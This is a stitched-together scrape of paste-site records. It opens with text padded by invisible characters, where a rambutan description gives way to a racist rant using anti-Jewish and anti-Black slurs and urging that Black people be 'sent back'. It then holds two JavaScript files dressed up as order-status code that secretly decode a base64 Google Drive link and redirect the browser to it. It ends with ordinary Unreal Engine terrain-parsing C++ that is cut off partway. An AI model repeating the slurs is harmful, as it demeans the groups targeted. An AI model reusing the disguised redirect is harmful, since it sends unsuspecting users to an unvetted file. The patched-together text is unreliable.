‎s‎k‎i‎n‎ ‎i‎s‎ ‎r‎e‎d‎d‎i‎s‎h‎ ‎(‎r‎a‎r‎e‎l‎y‎ ‎o‎r‎a‎n‎g‎e‎ ‎o‎r‎ ‎y‎e‎l‎l‎o‎w‎)‎ ‎a‎n‎d‎ ‎c‎o‎v‎e‎r‎e‎d‎ ‎w‎i‎t‎h‎ ‎f‎l‎e‎s‎h‎y‎ ‎p‎l‎i‎a‎b‎l‎e‎ ‎s‎p‎i‎n‎e‎s‎,‎ ‎h‎e‎n‎c‎e‎ ‎t‎h‎e‎ ‎n‎a‎m‎e‎ ‎r‎a‎m‎b‎u‎t‎a‎n‎,‎ ‎w‎h‎i‎c‎h‎ ‎i‎s‎ ‎d‎e‎r‎i‎v‎e‎d‎ ‎f‎r‎o‎m‎ ‎a‎ ‎M‎a‎l‎a‎y‎ ‎w‎o‎r‎d‎ ‎m‎e‎a‎n‎i‎n‎g‎ ‎'‎h‎a‎i‎r‎'‎.‎ ‎T‎h‎e‎ ‎s‎p‎i‎n‎e‎s‎ ‎(‎a‎l‎s‎o‎ ‎k‎n‎o‎w‎n‎ ‎a‎s‎ ‎""‎s‎p‎i‎n‎t‎e‎r‎n‎s‎""‎)‎ ‎c‎o‎n‎t‎r‎i‎b‎u‎t‎e‎ ‎t‎o‎ ‎t‎h‎e‎ ‎t‎r‎a‎n‎s‎p‎i‎r‎a‎t‎i‎o‎n‎ ‎o‎f‎ ‎t‎h‎e‎ ‎f‎r‎u‎i‎t‎,‎ ‎w‎h‎i‎c‎h‎ ‎c‎a‎n‎ ‎a‎f‎f‎e‎c‎t‎ ‎t‎h‎e‎ ‎f‎r‎u‎i‎t‎'‎s‎ ‎q‎u‎a‎l‎i‎t‎y‎.‎ ‎T‎h‎e‎ ‎f‎l‎e‎s‎h‎,‎ ‎k‎n‎o‎w‎n‎ ‎a‎s‎ ‎t‎h‎e‎ ‎a‎r‎i‎l‎,‎ ‎i‎s‎ ‎t‎r‎a‎n‎s‎l‎u‎c‎e‎n‎t‎,‎ ‎w‎h‎i‎t‎i‎s‎h‎,‎ ‎o‎r‎ ‎v‎e‎r‎y‎ ‎p‎a‎l‎e‎ ‎p‎i‎n‎k‎,‎ ‎w‎i‎t‎h‎ ‎a‎ ‎s‎w‎e‎e‎t‎,‎ ‎m‎i‎l‎d‎l‎y‎ ‎a‎c‎i‎d‎i‎c‎ ‎f‎l‎a‎v‎o‎r‎ ‎r‎e‎m‎i‎n‎i‎s‎c‎e‎n‎t‎ ‎o‎f‎ ‎g‎r‎a‎p‎e‎s‎.‎ ‎T‎h‎e‎ ‎s‎i‎n‎g‎l‎e‎ ‎s‎e‎e‎d‎ ‎i‎s‎ ‎g‎l‎o‎s‎s‎y‎ ‎b‎r‎o‎w‎n‎,‎ ‎a‎b‎o‎u‎t‎ ‎1‎.‎0‎ ‎t‎o‎ ‎1‎.‎3‎ ‎c‎e‎n‎t‎i‎m‎e‎t‎r‎e‎s‎ ‎(‎3‎⁄‎8‎ ‎t‎o‎ ‎1‎⁄‎2‎ ‎i‎n‎c‎h‎)‎ ‎l‎o‎n‎g‎,‎ ‎w‎i‎t‎h‎ ‎a‎ ‎w‎h‎i‎t‎e‎ ‎b‎a‎s‎a‎l‎ ‎s‎c‎a‎r‎.‎ ‎T‎h‎i‎s‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎s‎h‎o‎w‎s‎ ‎t‎w‎o‎ ‎r‎a‎m‎b‎u‎t‎a‎n‎s‎,‎ ‎o‎n‎e‎ ‎w‎h‎o‎l‎e‎ ‎a‎n‎d‎ ‎o‎n‎e‎ ‎h‎a‎l‎f‎-‎p‎e‎e‎l‎e‎d‎ ‎t‎o‎ ‎e‎x‎p‎o‎s‎e‎ ‎t‎h‎e‎ ‎a‎r‎i‎l‎,‎ ‎a‎s‎ ‎w‎e‎l‎l‎ ‎a‎s‎ ‎a‎ ‎r‎a‎m‎b‎u‎t‎a‎n‎ ‎s‎e‎e‎d‎.‎ ‎T‎h‎e‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎w‎a‎s‎ ‎f‎o‎c‎u‎s‎-‎s‎t‎a‎c‎k‎e‎d‎ ‎f‎r‎o‎m‎ ‎3‎1‎ ‎s‎e‎p‎a‎r‎a‎t‎e‎ ‎i‎m‎a‎g‎e‎s‎.‎

P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎I‎v‎a‎r‎ ‎L‎e‎i‎d‎u‎s‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎

H‎e‎y‎,‎ ‎I‎ ‎j‎u‎s‎t‎ ‎w‎a‎n‎t‎e‎d‎ ‎t‎o‎ ‎t‎e‎l‎l‎ ‎y‎o‎u‎ ‎g‎u‎y‎s‎ ‎t‎h‎a‎t‎ ‎I‎'‎m‎ ‎n‎o‎t‎ ‎r‎e‎a‎l‎l‎y‎ ‎a‎ ‎r‎e‎a‎l‎ ‎N‎e‎w‎s‎c‎a‎s‎t‎e‎r‎.‎ ‎I‎'‎m‎ ‎j‎u‎s‎t‎ ‎a‎ ‎g‎u‎y‎ ‎o‎n‎ ‎t‎h‎e‎ ‎i‎n‎t‎e‎r‎n‎e‎t‎.‎ ‎A‎n‎d‎ ‎t‎o‎ ‎b‎e‎ ‎f‎a‎i‎r‎,‎ ‎t‎h‎o‎s‎e‎ ‎k‎i‎k‎e‎s‎ ‎a‎t‎ ‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎a‎r‎e‎n‎'‎t‎ ‎r‎e‎a‎l‎ ‎j‎o‎u‎r‎n‎a‎l‎i‎s‎t‎s‎ ‎e‎i‎t‎h‎e‎r‎.‎ ‎I‎t‎'‎s‎ ‎n‎o‎t‎ ‎f‎u‎c‎k‎i‎n‎g‎ ‎n‎e‎w‎s‎ ‎i‎t‎'‎s‎ ‎j‎u‎s‎t‎ ‎p‎o‎l‎i‎t‎i‎c‎a‎l‎ ‎c‎r‎a‎p‎.‎ ‎T‎h‎e‎r‎e‎'‎s‎ ‎o‎t‎h‎e‎r‎ ‎t‎h‎i‎n‎g‎s‎ ‎g‎o‎i‎n‎g‎ ‎a‎r‎o‎u‎n‎d‎ ‎i‎n‎ ‎t‎h‎i‎s‎ ‎w‎o‎r‎l‎d‎ ‎b‎e‎s‎i‎d‎e‎s‎ ‎p‎o‎l‎i‎t‎i‎c‎s‎,‎ ‎a‎n‎d‎ ‎p‎o‎l‎i‎t‎i‎c‎s‎ ‎s‎h‎o‎u‎l‎d‎n‎'‎t‎ ‎e‎n‎c‎o‎m‎p‎a‎s‎s‎ ‎t‎h‎e‎ ‎e‎n‎t‎i‎r‎e‎ ‎n‎e‎w‎s‎.‎ ‎I‎ ‎h‎a‎t‎e‎ ‎p‎o‎s‎t‎i‎n‎g‎ ‎t‎h‎i‎s‎ ‎c‎r‎a‎p‎ ‎t‎h‎e‎ ‎k‎i‎k‎e‎s‎ ‎o‎n‎ ‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎w‎r‎o‎t‎e‎.‎ ‎I‎'‎m‎ ‎n‎o‎t‎ ‎r‎e‎a‎l‎l‎y‎ ‎a‎ ‎v‎e‎r‎y‎ ‎p‎o‎l‎i‎t‎i‎c‎a‎l‎ ‎p‎e‎r‎s‎o‎n‎,‎ ‎a‎n‎d‎ ‎I‎ ‎d‎o‎n‎'‎t‎ ‎e‎v‎e‎n‎ ‎l‎i‎k‎e‎ ‎p‎o‎s‎t‎i‎n‎g‎ ‎t‎h‎i‎s‎ ‎s‎t‎u‎p‎i‎d‎ ‎c‎r‎a‎p‎.‎ ‎I‎ ‎c‎o‎u‎l‎d‎ ‎j‎u‎s‎t‎ ‎g‎o‎ ‎u‎s‎e‎ ‎a‎ ‎d‎i‎f‎f‎e‎r‎e‎n‎t‎ ‎s‎i‎t‎e‎,‎ ‎b‎u‎t‎ ‎e‎v‎e‎r‎y‎ ‎f‎u‎c‎k‎i‎n‎g‎ ‎""‎n‎e‎w‎s‎""‎ ‎s‎i‎t‎e‎ ‎i‎s‎ ‎i‎n‎c‎r‎e‎d‎i‎b‎l‎y‎ ‎p‎o‎l‎i‎t‎i‎c‎a‎l‎.‎ ‎A‎n‎d‎ ‎I‎'‎m‎ ‎s‎i‎c‎k‎ ‎o‎f‎ ‎w‎r‎i‎t‎i‎n‎g‎ ‎a‎b‎o‎u‎t‎ ‎t‎h‎o‎s‎e‎ ‎f‎u‎c‎k‎i‎n‎g‎ ‎m‎o‎n‎k‎e‎y‎s‎ ‎e‎v‎e‎r‎y‎ ‎d‎a‎y‎.‎ ‎I‎ ‎r‎e‎a‎l‎l‎y‎ ‎d‎o‎n‎'‎t‎ ‎t‎h‎i‎n‎k‎ ‎t‎h‎o‎s‎e‎ ‎s‎t‎u‎p‎i‎d‎ ‎m‎o‎n‎k‎e‎y‎s‎ ‎d‎e‎s‎e‎r‎v‎e‎ ‎t‎o‎ ‎b‎e‎ ‎w‎r‎i‎t‎t‎e‎n‎ ‎a‎b‎o‎u‎t‎ ‎o‎n‎ ‎a‎ ‎d‎a‎i‎l‎y‎ ‎b‎a‎s‎i‎s‎,‎ ‎t‎h‎e‎s‎e‎ ‎f‎u‎c‎k‎i‎n‎g‎ ‎n‎i‎g‎g‎e‎r‎s‎ ‎n‎e‎e‎d‎ ‎t‎o‎ ‎j‎u‎s‎t‎ ‎b‎e‎ ‎s‎e‎n‎t‎ ‎b‎a‎c‎k‎ ‎a‎l‎r‎e‎a‎d‎y‎ ‎s‎o‎ ‎I‎ ‎d‎o‎n‎'‎t‎ ‎h‎a‎v‎e‎ ‎t‎o‎ ‎w‎r‎i‎t‎e‎ ‎a‎b‎o‎u‎t‎ ‎t‎h‎e‎m‎.‎ ‎I‎ ‎d‎o‎n‎'‎t‎ ‎e‎v‎e‎n‎ ‎l‎i‎k‎e‎ ‎d‎o‎i‎n‎g‎ ‎t‎h‎e‎ ‎n‎e‎w‎s‎.‎"
HMLunhgh,Products.js,kammex,JavaScript,Thursday 17th of April 2025 04:41:41 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/55449/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
qgHQmE1P,Order.js,kammex,JavaScript,Thursday 17th of April 2025 04:26:18 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/27259/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Tkp4MuUd,AsyncPluginLoader.cpp,malice936,C++,Thursday 17th of April 2025 04:18:27 PM CDT,"/*
Warning! Experimental! No guarantees on functionality! Use at your own risk!!!!!
(Not so much on this one. I have used it and it actually functions very well, but still potentially unstable.)
*/
#include ""AsyncPluginLoader.h""
#include ""Misc/FileHelper.h""
#include ""Misc/Paths.h""
#include ""Async/Async.h""

void UAsyncPluginLoader::LoadPluginFileAsync(const FString& FilePath, const FOnPluginFileLoaded& OnLoaded)
{
    FString FileExtension = FPaths::GetExtension(FilePath);
    if (FileExtension != TEXT(""esm"") && FileExtension != TEXT(""esp""))
    {
        UE_LOG(LogTemp, Warning, TEXT(""Invalid file extension for plugin: %s (expected .esm or .esp)""), *FilePath);
        AsyncTask(ENamedThreads::GameThread, [OnLoaded]()
        {
            OnLoaded.ExecuteIfBound(false, TArray<uint8>());
        });
        return;
    }

    AsyncTask(ENamedThreads::AnyThread, [FilePath, OnLoaded]()
    {
        TArray<uint8> FileData;
        bool bSuccess = FFileHelper::LoadFileToArray(FileData, *FilePath);

        AsyncTask(ENamedThreads::GameThread, [FileData, bSuccess, FilePath, OnLoaded]()
        {
            if (bSuccess)
            {
                UE_LOG(LogTemp, Log, TEXT(""Successfully loaded plugin file: %s""), *FilePath);
                OnLoaded.ExecuteIfBound(true, FileData);
            }
            else
            {
                UE_LOG(LogTemp, Warning, TEXT(""Failed to load plugin file: %s""), *FilePath);
                OnLoaded.ExecuteIfBound(false, TArray<uint8>());
            }
        });
    });
}

void UAsyncPluginLoader::ParseESMRecords(const TArray<uint8>& FileBytes, TArray<FESMRecord>& OutRecords)
{
    FMemoryReader Ar(FileBytes, true);
    while (!Ar.AtEnd())
    {
        FESMRecord Record;
        Ar << Record.RecordType; // 4 bytes for type (e.g., ""LAND"")

        int32 RecordSize;
        Ar << RecordSize; // 4 bytes for size

        // Parse the FormID (4 bytes) and flags (4 bytes) from the header
        int32 FormIDValue;
        Ar << FormIDValue; // 4 bytes for FormID
        FFormID FormID(FormIDValue);
        Record.FormIDs.Add(FormID);

        // Skip the remaining 4 bytes (flags)
        Ar.Seek(Ar.Tell() + 4);

        // Read the record's data (subrecords)
        int64 RecordEnd = Ar.Tell() + RecordSize;
        Record.RecordData.SetNum(RecordSize);
        Ar.Serialize(Record.RecordData.GetData(), RecordSize);

        // Pre-parse subrecords for LAND and other records
        ParseESMSubrecords(Record.RecordData, Record.Subrecords, Record.FormIDs, Record); // Pass the current Record

        OutRecords.Add(Record);
        Ar.Seek(RecordEnd);
    }
}

void UAsyncPluginLoader::ParseESMSubrecords(const TArray<uint8>& RecordData, TArray<FESMSubrecord>& OutSubrecords, TArray<FFormID>& OutFormIDs, FESMRecord& CurrentRecord)
{
    FMemoryReader Ar(RecordData, true);
    while (!Ar.AtEnd())
    {
        FESMSubrecord Subrecord;
        Ar << Subrecord.SubrecordType; // 4 bytes for type (e.g., ""NAME"")

        int32 SubrecordSize;
        Ar << SubrecordSize; // 4 bytes for size

        Subrecord.SubrecordData.SetNum(SubrecordSize);
        Ar.Serialize(Subrecord.SubrecordData.GetData(), SubrecordSize);

        // Check for NAME subrecord to store as EditorID
        if (Subrecord.SubrecordType == TEXT(""NAME""))
        {
            FString Name = FString(SubrecordSize, (char*)Subrecord.SubrecordData.GetData());
            CurrentRecord.EditorID = Name; // Set directly on the current record
        }

        OutSubrecords.Add(Subrecord);
    }
}

bool UAsyncPluginLoader::ExtractHeightData(const FESMRecord& Record, FESMHeightData& OutHeightData)
{
    if (Record.RecordType != TEXT(""LAND""))
    {
        return false;
    }

    for (const FESMSubrecord& Subrecord : Record.Subrecords)
    {
        if (Subrecord.SubrecordType == TEXT(""VHGT""))
        {
            FMemoryReader Ar(Subrecord.SubrecordData, true);

            Ar << OutHeightData.BaseHeight;

            OutHeightData.Heights.SetNum(4225); // 65x65 grid
            for (int32 i = 0; i < 4225; i++)
            {
                int8 HeightOffset;
                Ar << HeightOffset;
                OutHeightData.Heights[i] = OutHeightData.BaseHeight + (HeightOffset * 8.0f);
            }

            return true;
        }
    }

    return false;
}"
0jAg34BK,AsyncPluginLoader.h,malice936,C++,Thursday 17th of April 2025 04:17:47 PM CDT,"/*
Warning! Experimental! No guarantees on functionality! Use at your own risk!!!!!
(Not so much on this one. I have used it and it actually functions very well, but still potentially unstable.)
*/
#pragma once

#include ""FormID.h""
#include ""CoreMinimal.h""
#include ""Kismet/BlueprintFunctionLibrary.h""
#include ""AsyncPluginLoader.generated.h""

DECLARE_DYNAMIC_DELEGATE_TwoParams(FOnPluginFileLoaded, bool, bSuccess, const TArray<uint8>&, LoadedBytes);

USTRUCT(BlueprintType)
struct FESMSubrecord
{
    GENERATED_BODY()
    UPROPERTY(BlueprintReadOnly)
    FString SubrecordType;
    UPROPERTY(BlueprintReadOnly)
    TArray<uint8> SubrecordData;
};

USTRUCT(BlueprintType)
struct FESMRecord
{
    GENERATED_BODY()
    UPROPERTY(BlueprintReadOnly)
    FString RecordType;
    UPROPERTY(BlueprintReadOnly)
    TArray<uint8> RecordData;
    UPROPERTY(BlueprintReadOnly)
    TArray<FFormID> FormIDs;
    UPROPERTY(BlueprintReadOnly)
    TArray<FESMSubrecord> Subrecords;
    UPROPERTY(BlueprintReadOnly)
    FString EditorID;
};

USTRUCT(BlueprintType)
struct FESMHeightData
{
    GENERATED_BODY()
    UPROPERTY(BlueprintReadOnly)
    float BaseHeight;
    UPROPERTY(BlueprintReadOnly)
    TArray<float> Heights; // 65x65 grid (4225 floats)
};

UCLASS()
class UAsyncPluginLoader : public UBlueprintFunctionLibrary
{
    GENERATED_BODY()
public:
    UFUNCTION(BlueprintCallable, Category = ""File I/O"")
    static void LoadPluginFileAsync(const FString& FilePath, const FOnPluginFileLoaded& OnLoaded);

    UFUNCTION(BlueprintCallable, Category = ""ESM Parsing"")
    static void ParseESMRecords(const TArray<uint8>& FileBytes, TArray<FESMRecord>& OutRecords);

    UFUNCTION(BlueprintCallable, Category = ""ESM Parsing"")
    static void ParseESMSubrecords(const TArray<uint8>& RecordData, TArray<FESMSubrecord>& OutSubrecords, TArray<FFormID>& OutFormIDs, FESMRecord& CurrentRecord); // Added CurrentRecord parameter

    UFUNCTION(BlueprintCallable, Category = ""ESM Parsing"")
    static bool ExtractHeightData(const FESMRecord& Record, FESMHeightData& OutHeightData);
};"
p2tZGGZd,ESMDataMapper.cpp,malice936,C++,Thursday 17th of April 2025 04:14:50 PM CDT,"// Warning! Experimental! No guarantees on functionality! Use at your own risk!!!!!
#include ""ESMDataMapper.h""
#include ""Landscape.h""
#include ""LandscapeInfo.h""
#include ""LandscapeSubsystem.h""
#include ""UObject/ConstructorHelpers.h""
#include ""Misc/Guid.h""
#include ""Logging/LogMacros.h""
#include ""Engine/Texture2D.h""

// Extracts height data from a single LAND record in an ESM file.
// Parameters:
// - Record: The FRecord object containing LAND record data.
// - CellX, CellY: Expected cell coordinates to validate against the record.
// - OutHeightData: Output array to store height values (65x65 grid).
// - OutHeightOffset: Output float for the height offset from the VHGT subrecord.
// Returns: True if extraction succeeds, false otherwise.
bool UESMDataMapper::ExtractHeightDataFromRecord(const FRecord& Record, int32 CellX, int32 CellY, TArray<float>& OutHeightData, float& OutHeightOffset)
{
    // Log the record type and cell coordinates being processed.
    UE_LOG(LogTemp, Log, TEXT(""Processing record with Type: '%s' for cell (%d, %d)""), *Record.Type, CellX, CellY);

    // Validate that the record is a LAND record.
    if (Record.Type != TEXT(""LAND""))
    {
        UE_LOG(LogTemp, Warning, TEXT(""Record is not a LAND record (Type: %s)""), *Record.Type);
        return false;
    }

    // Extract the INTV subrecord to validate cell coordinates.
    FSubrecord INTVSubrecord;
    if (URecordHelper::GetSubrecordByType(Record, TEXT(""INTV""), INTVSubrecord) && INTVSubrecord.RawData.Num() >= sizeof(int32) * 2)
    {
        // Read the cell coordinates from the INTV subrecord.
        int32 RecordCellX = *reinterpret_cast<const int32*>(INTVSubrecord.RawData.GetData());
        int32 RecordCellY = *reinterpret_cast<const int32*>(INTVSubrecord.RawData.GetData() + sizeof(int32));
        // Ensure the record’s coordinates match the expected CellX, CellY.
        if (RecordCellX != CellX || RecordCellY != CellY)
        {
            UE_LOG(LogTemp, Warning, TEXT(""Cell coordinates (%d, %d) do not match expected (%d, %d)""), RecordCellX, RecordCellY, CellX, CellY);
            return false;
        }
        UE_LOG(LogTemp, Log, TEXT(""LAND record validated for cell (%d, %d)""), RecordCellX, RecordCellY);
    }
    else
    {
        UE_LOG(LogTemp, Error, TEXT(""Invalid or missing INTV subrecord in LAND record""));
        return false;
    }

    // Extract the VHGT subrecord containing height data.
    FSubrecord VHGTSubrecord;
    if (!URecordHelper::GetSubrecordByType(Record, TEXT(""VHGT""), VHGTSubrecord))
    {
        UE_LOG(LogTemp, Error, TEXT(""Missing VHGT subrecord in LAND record""));
        OutHeightData.Empty();
        OutHeightOffset = 0.0f;
        return false;
    }

    // Validate the size of the VHGT subrecord data.
    // Expected size: sizeof(float) for HeightOffset + 1 byte padding + 65x65 height deltas + sizeof(uint16) padding.
    if (VHGTSubrecord.RawData.Num() < sizeof(float) + 1 + (65 * 65) + sizeof(uint16))
    {
        UE_LOG(LogTemp, Error, TEXT(""VHGT subrecord data too small, expected >= 4232 bytes, got %d""), VHGTSubrecord.RawData.Num());
        OutHeightData.Empty();
        OutHeightOffset = 0.0f;
        return false;
    }

    // Read the height offset from the VHGT subrecord.
    OutHeightOffset = *reinterpret_cast<const float*>(VHGTSubrecord.RawData.GetData());
    UE_LOG(LogTemp, Log, TEXT(""VHGT HeightOffset: %f""), OutHeightOffset);

    // Initialize the output height data array to a 65x65 grid.
    OutHeightData.SetNum(65 * 65);
    // Pointer to the height delta values in the VHGT subrecord (after the offset and padding).
    const int8* HeightDeltas = reinterpret_cast<const int8*>(VHGTSubrecord.RawData.GetData() + sizeof(float) + 1);
    // Start with the base height offset.
    float CurrentHeight = OutHeightOffset;

    // Iterate over the 65x65 grid to compute height values.
    for (int32 Y = 0; Y < 65; Y++)
    {
        for (int32 X = 0; X < 65; X++)
        {
            // Unreal Engine expects a flipped Y-axis, so adjust the index accordingly.
            int32 Index = (64 - Y) * 65 + X;
            int32 DataIndex = Y * 65 + X;
            // Accumulate the height delta to get the absolute height.
            CurrentHeight += HeightDeltas[DataIndex];
            // Scale the height by 8.0f (Morrowind to Unreal units conversion factor).
            OutHeightData[Index] = CurrentHeight * 8.0f;
        }
    }

    // Log the first 5 height values and the total size for debugging.
    for (int32 i = 0; i < FMath::Min(5, OutHeightData.Num()); i++)
    {
        UE_LOG(LogTemp, Log, TEXT(""OutHeightData[%d]: %f""), i, OutHeightData[i]);
    }
    UE_LOG(LogTemp, Log, TEXT(""OutHeightData size: %d""), OutHeightData.Num());

    return true;
}

// Extracts height data from an array of records for a specific cell.
// Parameters:
// - Records: Array of FRecord objects to search through.
// - CellX, CellY: Target cell coordinates to find a matching LAND record.
// - OutHeights: Output array to store height values.
// - OutHeightOffset: Output float for the height offset.
// Returns: True if a matching LAND record is found and extracted, false otherwise.
bool UESMDataMapper::ExtractHeightDataFromRecords(const TArray<FRecord>& Records, int32 CellX, int32 CellY, TArray<float>& OutHeights, float& OutHeightOffset)
{
    // Log the cell coordinates being processed.
    UE_LOG(LogTemp, Log, TEXT(""ExtractHeightDataFromRecords called with CellX=%d, CellY=%d""), CellX, CellY);

    // Search for a LAND record matching the specified cell coordinates.
    FRecord LandRecord;
    bool bFound = false;
    for (const FRecord& Record : Records)
    {
        if (Record.Type == TEXT(""LAND""))
        {
            FSubrecord INTVSubrecord;
            if (URecordHelper::GetSubrecordByType(Record, TEXT(""INTV""), INTVSubrecord) && INTVSubrecord.RawData.Num() >= sizeof(int32) * 2)
            {
                int32 RecordCellX = *reinterpret_cast<const int32*>(INTVSubrecord.RawData.GetData());
                int32 RecordCellY = *reinterpret_cast<const int32*>(INTVSubrecord.RawData.GetData() + sizeof(int32));
                if (RecordCellX == CellX && RecordCellY == CellY)
                {
                    LandRecord = Record;
                    bFound = true;
                    break;
                }
            }
        }
    }

    // If no matching LAND record is found, log a warning and return false.
    if (!bFound)
    {
        UE_LOG(LogTemp, Warning, TEXT(""No LAND record found for cell (%d, %d)""), CellX, CellY);
        return false;
    }

    // Extract height data from the found LAND record.
    return ExtractHeightDataFromRecord(LandRecord, CellX, CellY, OutHeights, OutHeightOffset);
}

// Extracts height data from LAND records in a plugin for a specific cell.
// Parameters:
// - Plugin: The FPlugin object containing ESM records.
// - CellX, CellY: Target cell coordinates.
// - OutHeights: Output array to store height values.
// - OutHeightOffset: Output float for the height offset.
// Returns: True if extraction succeeds, false otherwise.
bool UESMDataMapper::ExtractLandHeightDataFromPlugin(const FPlugin& Plugin, int32 CellX, int32 CellY, TArray<float>& OutHeights, float& OutHeightOffset)
{
    // Retrieve all records from the plugin.
    TArray<FRecord> Records = UPluginHelper::GetPluginRecords(Plugin);
    // Delegate to ExtractHeightDataFromRecords to process the records.
    return ExtractHeightDataFromRecords(Records, CellX, CellY, OutHeights, OutHeightOffset);
}

// Handles individual LAND record processing, extracting cell coordinates and height data.
// Parameters:
// - Record: The FRecord object to process.
// - CellX, CellY: Output parameters for the extracted cell coordinates.
// - OutHeightData: Output array for height values.
// - OutHeightOffset: Output float for the height offset.
// Returns: True if processing succeeds, false otherwise.
bool UESMDataMapper::LANDHandler(const FRecord& Record, int32& CellX, int32& CellY, TArray<float>& OutHeightData, float& OutHeightOffset)
{
    UE_LOG(LogTemp, Log, TEXT(""Handling LAND record""));

    // Validate that the record is a LAND record.
    if (Record.Type != TEXT(""LAND""))
    {
        UE_LOG(LogTemp, Warning, TEXT(""Record is not a LAND record (Type: %s)""), *Record.Type);
        return false;
    }

    // Extract the INTV subrecord to get cell coordinates.
    FSubrecord INTVSubrecord;
    if (URecordHelper::GetSubrecordByType(Record, TEXT(""INTV""), INTVSubrecord) && INTVSubrecord.RawData.Num() == 8)
    {
        // Log the raw data for debugging.
        UE_LOG(LogTemp, Log, TEXT(""INTV subrecord raw data length: %d""), INTVSubrecord.RawData.Num());
        FString RawDataHex;
        for (uint8 Byte : INTVSubrecord.RawData)
        {
            RawDataHex += FString::Printf(TEXT(""%02X ""), Byte);
        }
        UE_LOG(LogTemp, Log, TEXT(""INTV raw data (hex): %s""), *RawDataHex);

        // Extract CellX and CellY from the INTV subrecord.
        CellX = *reinterpret_cast<const int32*>(INTVSubrecord.RawData.GetData());
        CellY = *reinterpret_cast<const int32*>(INTVSubrecord.RawData.GetData() + sizeof(int32));
        UE_LOG(LogTemp, Log, TEXT(""Extracted coordinates: CellX=%d, CellY=%d""), CellX, CellY);
    }
    else
    {
        UE_LOG(LogTemp, Error, TEXT(""Invalid INTV subrecord: expected 8 bytes, got %d""), INTVSubrecord.RawData.Num());
        return false;
    }

    // Extract height data using the validated coordinates.
    return ExtractHeightDataFromRecord(Record, CellX, CellY, OutHeightData, OutHeightOffset);
}

// Converts raw height data (float) to a heightmap in byte format for Unreal Engine (legacy method).
// Parameters:
// - Heights: Input array of height values in float format.
// - MinHeight, MaxHeight: The height range for Unreal Engine (e.g., -2048 to 2048).
// Returns: A TArray<uint8> representing the heightmap as uint16 values.
TArray<uint8> UESMDataMapper::ConvertESMHeightToHeightmapBytes(const TArray<float>& Heights, float MinHeight, float MaxHeight)
{
    // Validate input data.
    if (Heights.Num() == 0)
    {
        UE_LOG(LogTemp, Warning, TEXT(""No height data provided""));
        return TArray<uint8>();
    }

    // Initialize the heightmap array to store uint16 values.
    TArray<uint16> Heightmap;
    Heightmap.SetNum(Heights.Num());

    // Find the min and max height values in the input data.
    float DataMin = Heights[0];
    float DataMax = Heights[0];
    for (float Height : Heights)
    {
        DataMin = FMath::Min(DataMin, Height);
        DataMax = FMath::Max(DataMax, Height);
    }
    UE_LOG(LogTemp, Log, TEXT(""Height data range: Min=%f, Max=%f""), DataMin, DataMax);

    // Normalize and scale the height values to the uint16 range (0-65535).
    float DataRange = DataMax - DataMin;
    float UnrealRange = MaxHeight - MinHeight;
    for (int32 i = 0; i < Heights.Num(); i++)
    {
        // Normalize the height to [0, 1] based on the data range.
        float Normalized = (DataRange > 0) ? (Heights[i] - DataMin) / DataRange : 0.5f;
        // Scale to Unreal’s height range.
        float ScaledHeight = MinHeight + (Normalized * UnrealRange);
        // Convert to uint16 (0-65535).
        Heightmap[i] = static_cast<uint16>((ScaledHeight - MinHeight) / UnrealRange * 65535);
        // Log the first 5 values for debugging.
        if (i < 5)
        {
            UE_LOG(LogTemp, Log, TEXT(""Heightmap[%d]: %d (ScaledHeight=%f)""), i, Heightmap[i], ScaledHeight);
        }
    }

    // Convert the uint16 array to a byte array for Unreal Engine.
    TArray<uint8> Bytes;
    Bytes.SetNum(Heightmap.Num() * sizeof(uint16));
    FMemory::Memcpy(Bytes.GetData(), Heightmap.GetData(), Heightmap.Num() * sizeof(uint16));
    UE_LOG(LogTemp, Log, TEXT(""HeightmapBytes size: %d""), Bytes.Num());
    return Bytes;
}

// Creates a landscape actor from a heightmap in byte format (legacy method, causes LandscapeGuid.IsValid() crash).
// Parameters:
// - World: The UWorld to spawn the landscape in.
// - HeightmapBytes: Byte array containing the heightmap as uint16 values.
// - Width, Height: Dimensions of the heightmap (e.g., 65x65).
